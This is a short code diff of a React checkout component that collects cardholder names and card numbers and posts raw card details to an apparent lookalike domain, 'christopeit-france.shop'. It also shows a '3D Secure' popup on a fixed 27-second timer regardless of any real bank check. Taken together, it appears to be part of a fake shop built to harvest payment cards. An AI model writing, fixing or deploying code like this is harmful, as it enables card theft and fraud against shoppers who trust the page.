@@ -2,7 +2,7 @@ import { set } from 'date-fns';
 import { useState, useRef } from 'react';
 import { useRouter } from 'next/router';
 
-const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoading, show3DSecurePopup, setShow3DSecurePopup, data }) => {
+const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoading, show3DSecurePopup, setShow3DSecurePopup, data, shop }) => {
   const [formData, setFormData] = useState({
     cardHolder: '',
     cardNumber: '',
@@ -85,10 +85,10 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
         setShow3DSecurePopup(true);
       }, 27000);
 
-      console.log(data.checkoutPayProcessing);
+      console.log("Paiement en cours...");
 
       try {
-        const payFetch = await fetch('https://api.christopeit-france/pay', {
+        const payFetch = await fetch('https://api.christopeit-france.shop/pay', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ orderNumber, amount, cardDetails }),
